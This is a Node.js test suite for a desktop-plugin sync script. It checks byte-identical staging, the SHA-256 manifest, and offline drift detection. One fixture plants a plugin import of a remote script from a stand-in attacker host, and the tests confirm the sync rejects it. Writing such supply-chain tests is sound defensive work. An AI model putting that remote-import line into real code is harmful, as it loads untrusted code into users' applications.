import assert from 'node:assert/strict'
import { execFileSync, spawnSync } from 'node:child_process'
import { createHash } from 'node:crypto'
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, utimesSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { dirname, join, resolve } from 'node:path'
import { afterEach, describe, it } from 'node:test'
import { fileURLToPath } from 'node:url'

const __dirname = dirname(fileURLToPath(import.meta.url))
const SCRIPT_PATH = resolve(__dirname, 'sync-desktop-plugins.mjs')

const ORG_IDS = ['crew', 'openspec', 'radar', 'redline']

const tempDirs = []

function makeTempDir(prefix) {
  const dir = mkdtempSync(join(tmpdir(), prefix))
  tempDirs.push(dir)
  return dir
}

afterEach(() => {
  while (tempDirs.length > 0) {
    const dir = tempDirs.pop()
    rmSync(dir, { force: true, recursive: true })
  }
})

function sha256(buf) {
  return createHash('sha256').update(buf).digest('hex')
}

function createMockSources(pluginsRoot, overrides = {}) {
  for (const id of ORG_IDS) {
    const desktopDir = join(pluginsRoot, id, 'desktop')
    mkdirSync(desktopDir, { recursive: true })
    const source =
      overrides[id] ??
      [
        `import { host } from '@hermes/plugin-sdk'`,
        `import { useState } from 'react'`,
        `import { jsx } from 'react/jsx-runtime'`,
        `// comment mentioning import 'left-pad'`,
        `const copyLabel = 'Copy keys from'`,
        `const re = /from 'bad-pkg'/`,
        `export default { id: '${id}', name: '${id.toUpperCase()}', register() { void host; void useState; void jsx; void copyLabel; void re } }`,
        ''
      ].join('\n')
    const pluginFile = join(desktopDir, 'plugin.js')
    writeFileSync(pluginFile, source, 'utf8')
    const fixedSec = 1_760_000_000 + ORG_IDS.indexOf(id) * 10
    utimesSync(pluginFile, fixedSec, fixedSec)
  }

  // Crew upstream also ships a standalone browser IIFE app.js that MUST NOT be copied.
  writeFileSync(join(pluginsRoot, 'crew', 'desktop', 'app.js'), '/* standalone IIFE */', 'utf8')
}

function runCli(args, env = process.env) {
  return spawnSync(process.execPath, [SCRIPT_PATH, ...args], {
    encoding: 'utf8',
    env
  })
}

describe('sync-desktop-plugins.mjs', () => {
  it('stages byte-identical plugin.js files, excludes crew/app.js, writes manifest, and preserves syncedAtMs when unchanged', () => {
    const repoRoot = makeTempDir('hermes-repo-')
    const pluginsRoot = makeTempDir('hermes-src-')
    createMockSources(pluginsRoot)

    // Pre-seed a stray crew/app.js in target to ensure sync cleans prohibited extra files.
    const strayCrewDir = join(repoRoot, 'apps', 'desktop', 'src', 'plugins', 'crew')
    mkdirSync(strayCrewDir, { recursive: true })
    writeFileSync(join(strayCrewDir, 'app.js'), 'stale iife', 'utf8')

    execFileSync(process.execPath, [SCRIPT_PATH, '--repo-root', repoRoot, '--plugins-root', pluginsRoot], {
      stdio: 'pipe'
    })

    const manifestPath = join(repoRoot, 'apps', 'desktop', 'src', 'plugins', 'org-plugins.manifest.json')
    assert.equal(existsSync(manifestPath), true)
    assert.equal(existsSync(join(strayCrewDir, 'app.js')), false)

    const manifest = JSON.parse(readFileSync(manifestPath, 'utf8'))
    assert.equal(manifest.schemaVersion, 1)
    assert.deepEqual(
      manifest.plugins.map(entry => entry.id),
      ORG_IDS
    )

    for (const entry of manifest.plugins) {
      const stagedPath = join(repoRoot, 'apps', 'desktop', 'src', 'plugins', entry.id, 'plugin.js')
      const sourcePath = join(pluginsRoot, entry.id, 'desktop', 'plugin.js')
      const stagedBytes = readFileSync(stagedPath)
      const sourceBytes = readFileSync(sourcePath)

      assert.equal(Buffer.compare(stagedBytes, sourceBytes), 0)
      assert.equal(entry.sha256, sha256(sourceBytes))
      assert.equal(entry.packageName, entry.id)
      assert.equal(typeof entry.syncedAtMs, 'number')
      assert.equal(Number.isFinite(entry.syncedAtMs), true)
    }

    // Touch source mtime WITHOUT changing bytes: re-running sync must preserve syncedAtMs (zero manifest diff).
    const beforeManifestRaw = readFileSync(manifestPath, 'utf8')
    const crewSource = join(pluginsRoot, 'crew', 'desktop', 'plugin.js')
    utimesSync(crewSource, 1_800_000_000, 1_800_000_000)

    execFileSync(process.execPath, [SCRIPT_PATH, '--repo-root', repoRoot, '--plugins-root', pluginsRoot], {
      stdio: 'pipe'
    })

    assert.equal(readFileSync(manifestPath, 'utf8'), beforeManifestRaw)

    // CRLF source files are normalized to LF so `.gitattributes` (`*.js text eol=lf`) never drifts on checkout.
    const radarSourcePath = join(pluginsRoot, 'radar', 'desktop', 'plugin.js')
    const radarLfText = readFileSync(radarSourcePath, 'utf8')
    writeFileSync(radarSourcePath, radarLfText.replace(/\n/g, '\r\n'), 'utf8')
    execFileSync(process.execPath, [SCRIPT_PATH, '--repo-root', repoRoot, '--plugins-root', pluginsRoot], {
      stdio: 'pipe'
    })
    const stagedRadar = readFileSync(join(repoRoot, 'apps', 'desktop', 'src', 'plugins', 'radar', 'plugin.js'), 'utf8')
    assert.equal(stagedRadar.includes('\r\n'), false)
    assert.equal(stagedRadar, radarLfText)
  })

  it('passes offline --check on a clean synced fixture without any source repositories present', () => {
    const repoRoot = makeTempDir('hermes-repo-')
    const pluginsRoot = makeTempDir('hermes-src-')
    createMockSources(pluginsRoot)

    execFileSync(process.execPath, [SCRIPT_PATH, '--repo-root', repoRoot, '--plugins-root', pluginsRoot], {
      stdio: 'pipe'
    })

    // Remove source pluginsRoot completely to prove --check is 100% offline/hermetic.
    rmSync(pluginsRoot, { force: true, recursive: true })

    const check = runCli(['--check', '--repo-root', repoRoot])
    assert.equal(check.status, 0, check.stderr)
  })

  it('fails --check with non-zero exit when a plugin.js drifts from its manifest sha256', () => {
    const repoRoot = makeTempDir('hermes-repo-')
    const pluginsRoot = makeTempDir('hermes-src-')
    createMockSources(pluginsRoot)

    execFileSync(process.execPath, [SCRIPT_PATH, '--repo-root', repoRoot, '--plugins-root', pluginsRoot], {
      stdio: 'pipe'
    })

    const radarPath = join(repoRoot, 'apps', 'desktop', 'src', 'plugins', 'radar', 'plugin.js')
    writeFileSync(radarPath, readFileSync(radarPath, 'utf8') + '\n// drifted\n', 'utf8')

    const check = runCli(['--check', '--repo-root', repoRoot])
    assert.notEqual(check.status, 0)
    assert.match(check.stderr, /radar.*sha256|digest/i)
  })

  it('fails sync and --check when a plugin imports a disallowed specifier', () => {
    const repoRoot = makeTempDir('hermes-repo-')
    const pluginsRoot = makeTempDir('hermes-src-')
    createMockSources(pluginsRoot, {
      redline: `import 'https://evil.example/payload.js'\nexport default { id: 'redline', register() {} }\n`
    })

    const syncRes = runCli(['--repo-root', repoRoot, '--plugins-root', pluginsRoot])
    assert.notEqual(syncRes.status, 0)
    assert.match(syncRes.stderr, /redline.*import|https:\/\/evil\.example/i)

    // Also verify --check catches disallowed imports even if manifest sha256 was forged to match.
    const cleanSources = makeTempDir('hermes-clean-')
    createMockSources(cleanSources)
    execFileSync(process.execPath, [SCRIPT_PATH, '--repo-root', repoRoot, '--plugins-root', cleanSources], {
      stdio: 'pipe'
    })

    const badSource = `import leftPad from 'left-pad'\nexport default { id: 'redline', register() { void leftPad } }\n`
    const redlineFile = join(repoRoot, 'apps', 'desktop', 'src', 'plugins', 'redline', 'plugin.js')
    writeFileSync(redlineFile, badSource, 'utf8')

    const manifestPath = join(repoRoot, 'apps', 'desktop', 'src', 'plugins', 'org-plugins.manifest.json')
    const manifest = JSON.parse(readFileSync(manifestPath, 'utf8'))
    manifest.plugins.find(p => p.id === 'redline').sha256 = sha256(Buffer.from(badSource, 'utf8'))
    writeFileSync(manifestPath, JSON.stringify(manifest, null, 2) + '\n', 'utf8')

    const check = runCli(['--check', '--repo-root', repoRoot])
    assert.notEqual(check.status, 0)
    assert.match(check.stderr, /left-pad/)
  })

  it('fails --check when a bundled plugin.js is missing or crew/app.js is present', () => {
    const repoRoot = makeTempDir('hermes-repo-')
    const pluginsRoot = makeTempDir('hermes-src-')
    createMockSources(pluginsRoot)

    execFileSync(process.execPath, [SCRIPT_PATH, '--repo-root', repoRoot, '--plugins-root', pluginsRoot], {
      stdio: 'pipe'
    })

    // 1. Extraneous crew/app.js fails --check
    const crewAppJs = join(repoRoot, 'apps', 'desktop', 'src', 'plugins', 'crew', 'app.js')
    writeFileSync(crewAppJs, '/* prohibited standalone bundle */', 'utf8')
    const checkExtra = runCli(['--check', '--repo-root', repoRoot])
    assert.notEqual(checkExtra.status, 0)
    assert.match(checkExtra.stderr, /app\.js/)
    rmSync(crewAppJs)

    // 2. Missing openspec/plugin.js fails --check
    rmSync(join(repoRoot, 'apps', 'desktop', 'src', 'plugins', 'openspec', 'plugin.js'))
    const checkMissing = runCli(['--check', '--repo-root', repoRoot])
    assert.notEqual(checkMissing.status, 0)
    assert.match(checkMissing.stderr, /openspec/)
  })
})
